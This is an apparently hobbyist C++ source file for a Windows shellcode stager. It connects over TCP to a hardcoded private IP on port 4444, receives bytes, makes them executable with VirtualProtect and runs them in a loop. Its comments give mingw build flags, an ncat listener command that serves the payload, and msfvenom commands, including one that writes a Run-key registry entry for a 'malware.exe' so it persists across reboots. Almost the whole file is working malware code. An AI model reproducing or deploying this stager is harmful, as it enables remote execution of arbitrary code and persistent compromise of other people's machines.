/* TODO:
 * https://github.com/rapid7/metasploit-framework/tree/master/data/headers/windows
 * https://github.com/rapid7/metasploit-framework/tree/master/data/templates/src/pe
 * https://github.com/rapid7/metasploit-framework/tree/master/external/source/shellcode/windows
 *
 * https://github.com/rapid7/metasploit-framework/tree/master/data/utilities/encrypted_payload
 *
 *
 *
 * */



#include "client.h"

#include <stdio.h>
#include <string.h>
#include <windows.h>
//#include <WS2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define BUFFER_SIZE 1024

// TODO: -static makes file 2-5x larger
// x86_64-w64-mingw32-g++ -o client.exe client.cpp -lws2_32 
// 		-fno-rtti -fno-exceptions -s
// ncat -lvp 4444 --send-only < payload.bin
//
// # Generate 64-bit shellcode
// msfvenom -p windows/x64/exec CMD="path/to/custom.exe" -f c

Client::Client() : 
    socket_(INVALID_SOCKET),
    connected_(false),
    initalized_(false)
{
    WSADATA wsaData;
    WORD wVersionRequired = MAKEWORD(2,2); // use winsock version 2.2
    if (WSAStartup(wVersionRequired, &wsaData) != 0)
    {
        // throw error
    }
    initalized_ = true;
}

Client::~Client()
{
    if (initalized_)
    {
        WSACleanup();
    }
}

bool Client::createSocket(int af, int type, int protocol)
{
    // TODO: add closesocket() ? 
    socket_ = socket(af, type, protocol);
    if (socket_ == INVALID_SOCKET)
    {
        return false;
    }

    connected_ = false;
    return true;
}

bool Client::createConnection(const std::string& host, const std::string& port)
{
    ADDRINFOA hints, *result = nullptr; // struct addrinfo 

    ZeroMemory(&hints, sizeof(hints));
    // memset(&hints, 0, sizeof(hints)); // use this instead of zeromemory for cross platform

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_protocol = IPPROTO_TCP;

    // Resolve address
    if (getaddrinfo(host.c_str(), port.c_str(), &hints, &result) != 0)
    {
        return false;
    }

    bool connected = false;
    for (auto ptr = result; ptr != nullptr; ptr = ptr->ai_next)
    {
        if (connect(socket_, ptr->ai_addr, (int)ptr->ai_addrlen) != SOCKET_ERROR)
        {
            connected = true;
            break;
        }
    }
    freeaddrinfo(result);
    connected_ = connected;
    return connected;
}

std::vector<unsigned char> Client::receiveData()
{
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
	//
    //int result = recv(socket_, recvBuffer_, RECV_BUFFER_SIZE, 0);
	std::vector<unsigned char> shellcode(4096);
	int received = recv(socket_, (char*)shellcode.data(), shellcode.size(), 0);
	if (received > 0) {
		shellcode.resize(received);
		return shellcode;
	}
	else
	{
		// TODO: throw error
	}
	return {};
	//                }
	//
    
    //if (result > 0) 
    //{
        // Success - create string from the received data
        //return std::string(recvBuffer_, result);
        // TODO: this might only be happening becuz im using ncat to send messages rn
		/*
        std::string received(recvBuffer_, result);
        if (!received.empty() && received.back() == '\n') 
        {
            received.pop_back();
            if (!received.empty() && received.back() == '\r') 
            {
                received.pop_back();
            }
        }*/
        //return received;
    //} 
    //else if (result == 0) 
    //{
        // Connection closed by server
        //connected_ = false;
        //throw std::runtime_error("Connection closed by server");
    //} 
    //else 
    //{
        // Error occurred
        //connected_ = false;
        //throw std::runtime_error("Receive failed: " + std::to_string(WSAGetLastError()));
    //}
}


void Client::sendData(const std::string& data) {
    if (!connected_) {
        throw std::runtime_error("Not connected to server");
    }
    
    int result = send(socket_, data.c_str(), data.length(), 0);
    
    if (result == SOCKET_ERROR) {
        connected_ = false;
        throw std::runtime_error("Send failed: " + std::to_string(WSAGetLastError()));
    }
    
    //return result;  // Returns number of bytes actually sent
}


// # Generate shellcode that runs reg.exe to add persistence
// msfvenom -p windows/exec CMD="reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MyApp /t REG_SZ /d C:\malware.exe" -f c

// TODO: this is extremly basic bare min for executing shell code
void executeShellcode(std::vector<unsigned char>& payload) 
{
	DWORD dwOldProtect;
	//if (VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect))
	if (VirtualProtect((LPVOID)payload.data(), payload.size(), PAGE_EXECUTE_READWRITE, &dwOldProtect))
	{
		//(*(void (*)()) payload)();
		((void(*)())payload.data())();
	}
	else
	{
		std::cout << "VirtualProtect failed" << std::endl;
	}

}

void Client::run(const std::string& host, const std::string& port)
{
    // Ensure socket is created
    if (socket_ == INVALID_SOCKET && !createSocket()) {
        std::cerr << "Failed to create socket" << std::endl;
        return;
    }
    
    // Connect to server
    if (!createConnection(host, port)) {
        std::cerr << "Failed to connect to " << host << ":" << port << std::endl;
        return;
    }
    
    std::cout << "Connected to " << host << ":" << port << ". Waiting for commands..." << std::endl;
    
    // Wait for incoming data from server
    while (connected_) {
		try {
			//auto command = receiveData();
			std::vector<unsigned char> command = receiveData();
			if (!command.empty())
			{
				executeShellcode(command);
			}
			else
			{
				// TODO: throw error
				// sendData("error");
			}
		} 
		catch (const std::exception& e) 
		{
            std::cerr << "Connection lost: " << e.what() << std::endl;
            break;
        }
    }
    
    std::cout << "Disconnected from server" << std::endl;
}

int main()
{
    std::cout << "test" << std::endl;
    Client tcpClient;
    tcpClient.run("172.18.245.234", "4444");
    //tcpClient.run("10.0.0.86", "4444");
}
